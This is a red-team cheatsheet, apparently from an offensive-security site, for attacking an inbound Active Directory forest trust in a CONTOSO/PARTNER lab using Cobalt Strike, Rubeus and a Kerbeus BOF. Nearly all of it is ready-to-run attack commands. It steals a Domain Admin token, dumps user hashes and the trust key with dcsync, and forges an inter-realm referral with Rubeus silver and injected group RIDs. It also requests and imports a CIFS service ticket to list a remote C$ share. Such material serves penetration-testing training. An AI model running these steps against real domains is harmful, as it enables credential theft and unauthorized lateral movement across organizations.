---
title: "Inbound Trusts · Foreign Principals and Resource Access"
description: "Trace foreign group membership and GPO permissions, then follow an authorized CONTOSO identity through a Kerberos referral into PARTNER resources."
category: "Forest & Domain Trusts"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "PowerShell"]
updated: "2026-11-11"
tags: ["ad", "trusts", "forest", "kerberos", "gpo"]
draft: false
---

## 1. Direction and prerequisites

PARTNER trusts CONTOSO. From **CONTOSO**, this relationship is **inbound**: CONTOSO identities can authenticate to PARTNER resources, subject to the permissions and authentication restrictions in PARTNER.

```text
Trust:   PARTNER → CONTOSO
Access:  CONTOSO users → PARTNER resources, if authorized
```

A forest trust does not automatically grant administrative rights. The practical goal is to identify a CONTOSO identity that already has permissions in PARTNER. The lab demonstrates this chain:

```text
CONTOSO\rsteel
  → CONTOSO\Partner Jump Users
  → PARTNER\Contoso Users
  → policy-defined permissions on applicable PARTNER hosts
```

The separate `pchilds` example later uses different identity data. Do not combine its RID and groups with the lab's `rsteel` credentials.

## 2. Enumerate the trust and foreign principals

Run the discovery commands from the CONTOSO Beacon. LDAP access to the remote domain depends on its permissions and authentication configuration.

```shell
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
# Example: 1 | partner.com | 8 | PARTNER
# 1 = inbound from CONTOSO; bit 8 = FOREST_TRANSITIVE

# Find external identities represented in PARTNER
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
# Relevant example SID: S-1-5-21-3926355307-1661546229-813047887-6102
# Its membership links it to PARTNER's Contoso Users group

# Resolve that SID in its source domain, CONTOSO
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName,samAccountName,member
# Example: Partner Jump Users, a CONTOSO group

# Enumerate direct user and group members of the source group
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
# Lab member: Robert Steel (rsteel)
```

A Foreign Security Principal (FSP) represents an external SID in the resource domain. Its `memberOf` describes membership there; it is not a TDO attribute. Resolve nested groups separately if they appear. The direct-member query is not recursive and is not a complete effective-membership calculation.

## 3. Locate resources and establish policy scope

```shell
# Locate a remote DC through the example DNS server
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
# Example: par-dc-1.partner.com, 10.10.122.1

# Inventory remote computers
ldapsearch (samAccountType=805306369) --attributes samAccountName,distinguishedName --hostname partner.com --dn DC=partner,DC=com
# Example: PAR-DC-1$, PAR-JMP-1$, PAR-WKSTN-1$

# Find GPO names and their SYSVOL paths
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
# Relevant example: Contoso Jump Users
# Path: \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}

# Download the policy template for local inspection
# Quote the UNC path because Windows NT contains a space
download "\\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
```

The lab's `[Group Membership]` section contains:

```ini
*S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
*S-1-5-21-4244029708-1901239654-2578485347-1104__Members =
```

`S-1-5-32-544` is BUILTIN\Administrators. The template places the group ending in `-1104` into Administrators where that policy is effectively applied. Resolve the group and find the policy links:

```shell
ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
# Example: Contoso Users; member includes the CONTOSO -6102 FSP

ldapsearch "(&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*))" --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name,gPLink
# Lab: policy linked at the partner domain root
```

A group membership or GPO link alone does not prove administrative access to every machine. Check effective application, filtering, inheritance and target configuration. Use the resource access result as the final check for the host being tested.

## 4. Lab path: obtain the authorized user's TGT

Discovery can run in a suitable ordinary user context. The following credential acquisition step requires separate replication rights in CONTOSO; the trust does not provide them.

```shell
# Optional lab transition from an elevated Beacon to the identified DA token
ps
steal_token <DYORK_PID>
# Lab identity: CONTOSO\dyork

# In the context with the required replication rights
dcsync contoso.com CONTOSO\rsteel
# Retain the current rsteel aes256_hmac value as <RSTEEL_AES256>

# Request rsteel's TGT using the exercise BOF extension
krb_asktgt /user:rsteel /aes256:<RSTEEL_AES256>
# Retain complete output as <RSTEEL_TGT_BASE64>
```

If valid credentials or a usable TGT for the authorized identity are already available, use them without repeating acquisition. The `krb_*` commands require the matching extension/aliases loaded in the environment.

Save the TGT in **PowerShell on the operator's machine**:

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\rsteel.kirbi', [Convert]::FromBase64String('<RSTEEL_TGT_BASE64>'))
```

## 5. Lab path: referral, CIFS ticket and import

Run the requests from Beacon:

```shell
# Request the inter-realm referral from the CONTOSO side
krb_asktgs /service:krbtgt/partner.com /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi
# Retain <RSTEEL_REFERRAL_BASE64>

# Request the actual CIFS ticket from the PARTNER KDC
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<RSTEEL_REFERRAL_BASE64>
# Retain <RSTEEL_CIFS_BASE64>
```

Convert the returned **CIFS ticket** in local PowerShell:

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\rsteel-cifs.kirbi', [Convert]::FromBase64String('<RSTEEL_CIFS_BASE64>'))
```

Importing the service ticket is required before the subsequent access. Do not skip it after requesting the ticket.

```shell
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel-cifs.kirbi
run klist
# Client: rsteel @ CONTOSO.COM
# Server: cifs/par-jmp-1.partner.com

ls \\par-jmp-1.partner.com\c$
# Expected in this lab: directory listing if the identified policy grants effective access

kerberos_ticket_purge
rev2self
```

## 6. Separate example: referral constructed with the trust key

The `pchilds` example uses a compromised trust key rather than requesting the referral with `rsteel`'s legitimate TGT. It still relies on source group membership accepted across the trust. SID filtering prevents simply carrying the parent-child ExtraSids technique into a different forest.

This path requires replication rights in CONTOSO and the correct directional trust key. It is an alternative, not an additional lab stage.

```shell
# In the authorized replication context in CONTOSO
dcsync contoso.com CONTOSO\PARTNER$
# Retain the corresponding NTLM/RC4 trust key as <TRUST_RC4>
# Do not substitute CONTOSO's krbtgt key
```

On the **operator's machine**, construct the example referral using the actual identity and source group data:

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:<TRUST_RC4> /nowrap
# Retain <PCHILDS_REFERRAL_BASE64>
```

| Argument | Meaning |
|---|---|
| `/sid` | CONTOSO domain SID |
| `/id:1105` | pchilds RID in this separate example |
| `/groups` | Source-domain group RIDs; `6102` represents Partner Jump Users |
| `/service` | Remote realm's `krbtgt` service, not CIFS |
| `/rc4` | Corresponding trust key; acceptance depends on encryption policy |

Present the referral to PARTNER from Beacon:

```shell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:<PCHILDS_REFERRAL_BASE64> /nowrap
# Retain <PCHILDS_CIFS_BASE64>
```

Convert the service ticket in local PowerShell, then import it in a separate matching Beacon context:

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\pchilds-cifs.kirbi', [Convert]::FromBase64String('<PCHILDS_CIFS_BASE64>'))
```

```shell
make_token CONTOSO\pchilds FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\pchilds-cifs.kirbi
run klist
ls \\par-jmp-1.partner.com\c$
kerberos_ticket_purge
rev2self
```

Ticket construction and acceptance depend on KDC validation and policy. A valid referral or service ticket does not invent administrative permissions for an otherwise unauthorized identity.

## 7. Troubleshooting

| Symptom | What to check |
|---|---|
| No FSP membership appears | Query the FSP in the resource domain and resolve its source SID |
| Source members appear inconsistent | Distinguish the rsteel lab and pchilds example; resolve nested groups |
| GPO is linked but access is denied | Actual policy application, filtering and target permissions |
| Replication fails | Rights in the domain being replicated |
| TGS request fails | Correct referral, remote KDC, SPN, encryption and ticket validity |
| CIFS access fails after a successful request | Import the service ticket, select its session and verify permissions |

Reference for trust-boundary SID filtering: [Microsoft PAC specification](https://winprotocoldoc.z19.web.core.windows.net/MS-PAC/%5BMS-PAC%5D-210625.pdf).

## 8. Quick checklist

The main checklist follows the rsteel lab. The trust-key/pchilds route above is a separate alternative.

```text
TRUST AND MEMBERSHIP
[ ] ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
[ ] Confirm inbound from CONTOSO: PARTNER trusts CONTOSO
[ ] ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
[ ] ldapsearch (objectSid=<SOURCE_GROUP_SID>) --attributes samAccountName,distinguishedName,member
[ ] Resolve source members and nested groups; select the intended authorized identity

RESOURCE PERMISSIONS
[ ] nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
[ ] ldapsearch (objectClass=groupPolicyContainer) --hostname <PARTNER_DC> --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
[ ] download "<GPO_SYSVOL_PATH>\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
[ ] Inspect [Group Membership], resolve group SIDs and find policy links
[ ] ldapsearch "(&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{<GPO_GUID>}*))" --hostname <PARTNER_DC> --dn DC=partner,DC=com --attributes name,gPLink
[ ] Check effective application rather than assuming every host is covered

RSTEEL TGT — IF NOT ALREADY AVAILABLE
[ ] Optional lab context: ps, then steal_token <DYORK_PID>
[ ] dcsync contoso.com CONTOSO\rsteel → requires replication rights
[ ] krb_asktgt /user:rsteel /aes256:<RSTEEL_AES256>
[ ] Local PowerShell: [IO.File]::WriteAllBytes('C:\path\rsteel.kirbi', [Convert]::FromBase64String('<RSTEEL_TGT_BASE64>'))

REFERRAL AND SERVICE TICKET
[ ] krb_asktgs /service:krbtgt/partner.com /ticket:C:\path\rsteel.kirbi
[ ] krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<RSTEEL_REFERRAL_BASE64>
[ ] Local PowerShell: [IO.File]::WriteAllBytes('C:\path\rsteel-cifs.kirbi', [Convert]::FromBase64String('<RSTEEL_CIFS_BASE64>'))
[ ] make_token CONTOSO\rsteel FakePass
[ ] kerberos_ticket_use C:\path\rsteel-cifs.kirbi
[ ] run klist → check rsteel, the CIFS SPN and validity
[ ] ls \\par-jmp-1.partner.com\c$
[ ] kerberos_ticket_purge → only the selected test session
[ ] rev2self
```

## Related references

- [Inter-realm tickets and trust fundamentals](/cheatsheets/inter-realm-tickets-cheatsheet/)
- [Parent-child trusts](/cheatsheets/parent-child-trust-cheatsheet/)
- [Outbound trusts](/cheatsheets/outbound-trust-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
